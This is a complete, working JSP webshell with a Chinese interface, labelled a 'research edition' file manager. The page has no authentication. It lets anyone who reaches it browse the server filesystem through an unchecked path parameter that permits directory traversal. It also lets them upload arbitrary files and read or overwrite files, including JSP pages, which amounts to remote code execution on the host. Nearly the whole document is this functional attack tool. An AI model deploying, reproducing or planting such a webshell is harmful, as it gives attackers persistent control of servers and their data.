<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*, java.util.*, javax.servlet.http.Part, java.net.URLEncoder, java.nio.file.Files, java.nio.file.Paths" %>
<%!
    String message = "";
    String messageType = "info";

    private String escapeJavaScript(String text) {
        return text.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n").replace("\r", "\\r");
    }
%>
<%
    String currentPath = application.getRealPath("/");
    String reqPath = request.getParameter("path");
    if (reqPath != null && !reqPath.trim().isEmpty()) {
        File requestedFile = new File(currentPath, reqPath);
        if (requestedFile.exists() && requestedFile.isDirectory()) {
            currentPath = requestedFile.getAbsolutePath();
        } else {
            message = "错误: 请求的路径无效或不是目录。";
            messageType = "error";
        }
    }

    if (!currentPath.endsWith(File.separator)) {
        currentPath += File.separator;
    }

    String action = request.getParameter("action");
    String target = request.getParameter("target");

    if ("upload".equals(action)) {
        try {
            if (request.getContentType() != null && request.getContentType().startsWith("multipart/form-data")) {
                for (Part part : request.getParts()) {
                    String fileName = part.getSubmittedFileName();
                    if (fileName != null && !fileName.isEmpty()) {
                        fileName = new File(fileName).getName();
                        String filePath = currentPath + fileName;
                        part.write(filePath);
                        message = "文件 '" + fileName + "' 上传成功！";
                        messageType = "success";
                    }
                }
            } else {
                message = "错误: 上传请求格式不正确。";
                messageType = "error";
            }
        } catch (Exception e) {
            message = "文件上传失败: " + e.getMessage();
            messageType = "error";
        }
    } else if ("save".equals(action) && target != null) {
        String fileContent = request.getParameter("fileContent");
        File fileToSave = new File(currentPath, new File(target).getName());
        try (FileOutputStream fos = new FileOutputStream(fileToSave);
             OutputStreamWriter osw = new OutputStreamWriter(fos, "UTF-8");
             BufferedWriter writer = new BufferedWriter(osw)) {
            writer.write(fileContent);
            message = "文件 '" + target + "' 保存成功！";
            messageType = "success";
        } catch (Exception e) {
            message = "文件保存失败: " + e.getMessage();
            messageType = "error";
        }
    }

    File currentDirFile = new File(currentPath);
    File[] files = currentDirFile.listFiles();
    if (files == null) {
        files = new File[0];
        message = "错误: 无法访问目录 " + currentPath;
        messageType = "error";
    }

    Arrays.sort(files, (f1, f2) -> {
        if (f1.isDirectory() && !f2.isDirectory()) return -1;
        if (!f1.isDirectory() && f2.isDirectory()) return 1;
        return f1.getName().compareToIgnoreCase(f2.getName());
    });
%>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webshell 文件管理器 - 研究版</title>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f4f7f6;
            color: #333;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
        }
        .container {
            background-color: #ffffff;
            padding: 25px 30px;
            border-radius: 12px;
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 900px;
            margin-bottom: 20px;
            box-sizing: border-box;
        }
        h1, h2 {
            color: #2c3e50;
            text-align: center;
            margin-bottom: 25px;
            font-weight: 600;
        }
        .current-path {
            background-color: #e9ecef;
            padding: 10px 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 0.9em;
            color: #555;
            word-wrap: break-word;
            overflow-wrap: break-word;
        }
        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0 8px;
            margin-top: 20px;
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #dee2e6;
        }
        th {
            background-color: #f8f9fa;
            font-weight: 600;
            color: #495057;
            border-bottom: 2px solid #adb5bd;
        }
        tr:last-child td {
            border-bottom: none;
        }
        tr:hover {
            background-color: #f0f0f0;
        }
        td a {
            color: #007bff;
            text-decoration: none;
            transition: color 0.2s ease;
        }
        td a:hover {
            color: #0056b3;
            text-decoration: underline;
        }
        .action-buttons a, .action-buttons button {
            background-color: #6c757d;
            color: white;
            padding: 8px 12px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85em;
            text-decoration: none;
            margin-right: 5px;
            transition: background-color 0.2s ease, transform 0.1s ease;
            display: inline-block;
        }
        .action-buttons a:hover, .action-buttons button:hover {
            background-color: #5a6268;
            transform: translateY(-1px);
        }
        .action-buttons .edit-btn {
            background-color: #28a745;
        }
        .action-buttons .edit-btn:hover {
            background-color: #218838;
        }

        .upload-form, .editor-form {
            margin-top: 30px;
            padding: 20px;
            background-color: #f8f9fa;
            border-radius: 10px;
            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.05);
        }
        .upload-form input[type="file"],
        .upload-form button,
        .editor-form textarea,
        .editor-form button {
            padding: 10px 15px;
            border-radius: 6px;
            border: 1px solid #ced4da;
            margin-right: 10px;
            font-size: 1em;
        }
        .upload-form button, .editor-form button {
            background-color: #007bff;
            color: white;
            border: none;
            cursor: pointer;
            transition: background-color 0.2s ease, transform 0.1s ease;
        }
        .upload-form button:hover, .editor-form button:hover {
            background-color: #0056b3;
            transform: translateY(-1px);
        }
        .editor-form textarea {
            width: calc(100% - 22px);
            height: 400px;
            margin-bottom: 15px;
            font-family: 'Cascadia Code', 'Consolas', 'Monaco', monospace;
            font-size: 0.95em;
            line-height: 1.5;
            resize: vertical;
            background-color: #fff;
            color: #333;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.05);
        }

        .message-box {
            display: none;
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            padding: 15px 25px;
            border-radius: 8px;
            font-weight: bold;
            color: white;
            z-index: 1000;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
            animation: fadeIn 0.5s ease-out;
        }
        .message-box.info { background-color: #17a2b8; }
        .message-box.success { background-color: #28a745; }
        .message-box.error { background-color: #dc3545; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }

        @media (max-width: 768px) {
            .container {
                padding: 15px 20px;
            }
            table, th, td {
                display: block;
            }
            th {
                text-align: right;
                padding-bottom: 0;
            }
            td {
                text-align: right;
                border-bottom: none;
                position: relative;
                padding-left: 50%;
            }
            td::before {
                content: attr(data-label);
                position: absolute;
                left: 0;
                width: 45%;
                padding-left: 15px;
                font-weight: bold;
                text-align: left;
            }
            .action-buttons {
                text-align: right;
            }
            .action-buttons a, .action-buttons button {
                margin-top: 5px;
                width: 100%;
                box-sizing: border-box;
            }
        }
    </style>
    <script>
        function showMessageBox(msg, type) {
            const msgBox = document.getElementById('messageBox');
            const msgText = document.getElementById('messageText');
            msgText.textContent = msg;
            msgBox.className = 'message-box ' + type;
            msgBox.style.display = 'block';
            setTimeout(() => {
                msgBox.style.display = 'none';
            }, 5000);
        }
    </script>
</head>
<body>
    <div id="messageBox" class="message-box">
        <span id="messageText"></span>
    </div>

    <div class="container">
        <h1>Webshell 文件管理器</h1>
        <p class="current-path">当前路径: <code><%= currentPath %></code></p>

        <table>
            <thead>
                <tr>
                    <th>名称</th>
                    <th>大小</th>
                    <th>最后修改时间</th>
                    <th>操作</th>
                </tr>
            </thead>
            <tbody>
                <%
                    String parentPath = new File(currentPath).getParent();
                    String currentPathRelativeEncoded = URLEncoder.encode(new File(application.getRealPath("/")).toURI().relativize(currentDirFile.toURI()).getPath(), "UTF-8");
                    if (parentPath != null) {
                        String parentPathRelative = new File(application.getRealPath("/")).toURI().relativize(new File(parentPath).toURI()).getPath();
                %>
                <tr>
                    <td data-label="名称"><a href="?path=<%= URLEncoder.encode(parentPathRelative, "UTF-8") %>">.. (上级目录)</a></td>
                    <td data-label="大小"></td>
                    <td data-label="最后修改时间"></td>
                    <td data-label="操作"></td>
                </tr>
                <%
                    }
                %>
                <%
                    for (File file : files) {
                        String fileName = file.getName();
                        String fileRelativePath = new File(application.getRealPath("/")).toURI().relativize(file.toURI()).getPath();
                        String filePathEncoded = URLEncoder.encode(fileRelativePath, "UTF-8");

                        String displaySize = "";
                        if (file.isFile()) {
                            long size = file.length();
                            if (size < 1024) {
                                displaySize = size + " B";
                            } else if (size < 1024 * 1024) {
                                displaySize = String.format("%.2f KB", size / 1024.0);
                            } else if (size < 1024 * 1024 * 1024) {
                                displaySize = String.format("%.2f MB", size / (1024.0 * 1024.0));
                            } else {
                                displaySize = String.format("%.2f GB", size / (1024.0 * 1024.0 * 1024.0));
                            }
                        } else {
                            displaySize = "目录";
                        }
                        String lastModified = new Date(file.lastModified()).toString();
                %>
                <tr>
                    <td data-label="名称">
                        <% if (file.isDirectory()) { %>
                            <a href="?path=<%= filePathEncoded %>">📁 <%= fileName %></a>
                        <% } else { %>
                            📄 <%= fileName %>
                        <% } %>
                    </td>
                    <td data-label="大小"><%= displaySize %></td>
                    <td data-label="最后修改时间"><%= lastModified %></td>
                    <td data-label="操作" class="action-buttons">
                        <% if (file.isFile()) { %>
                            <%
                                String[] editableExtensions = {".jsp", ".java", ".txt", ".html", ".xml", ".css", ".js", ".json", ".md"};
                                boolean isEditable = false;
                                for (String ext : editableExtensions) {
                                    if (fileName.toLowerCase().endsWith(ext)) {
                                        isEditable = true;
                                        break;
                                    }
                                }
                                if (isEditable) {
                            %>
                                <a href="?action=edit&path=<%= currentPathRelativeEncoded %>&target=<%= URLEncoder.encode(fileName, "UTF-8") %>" class="edit-btn">编辑</a>
                            <% } %>
                        <% } %>
                    </td>
                </tr>
                <%
                    }
                %>
            </tbody>
        </table>

        <div class="upload-form">
            <h2>上传文件</h2>
            <form action="?path=<%= currentPathRelativeEncoded %>&action=upload" method="post" enctype="multipart/form-data">
                <input type="file" name="file" required>
                <button type="submit">上传</button>
            </form>
        </div>

        <%
            if ("edit".equals(action) && target != null) {
                File fileToEdit = new File(currentPath, new File(target).getName());
                if (fileToEdit.exists() && fileToEdit.isFile()) {
                    StringBuilder fileContent = new StringBuilder();
                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(fileToEdit), "UTF-8"))) {
                        String line;
                        while ((line = reader.readLine()) != null) {
                            fileContent.append(line).append("\n");
                        }
                    } catch (Exception e) {
                        message = "读取文件失败: " + e.getMessage();
                        messageType = "error";
                    }
        %>
        <div class="editor-form">
            <h2>编辑文件: <%= target %></h2>
            <form action="?path=<%= currentPathRelativeEncoded %>&action=save&target=<%= URLEncoder.encode(target, "UTF-8") %>" method="post">
                <textarea name="fileContent"><%= fileContent.toString().replace("<", "&lt;").replace(">", "&gt;") %></textarea>
                <button type="submit">保存</button>
                <button type="button" onclick="window.location.href='?path=<%= currentPathRelativeEncoded %>'">取消</button>
            </form>
        </div>
        <%
                } else {
                    message = "错误: 无法编辑文件 '" + target + "'。文件不存在或不是文件。";
                    messageType = "error";
                }
            }
        %>
    </div>

    <script>
        <% if (!message.isEmpty()) { %>
            showMessageBox('<%= escapeJavaScript(message) %>', '<%= messageType %>');
        <% } %>
    </script>
</body>
</html>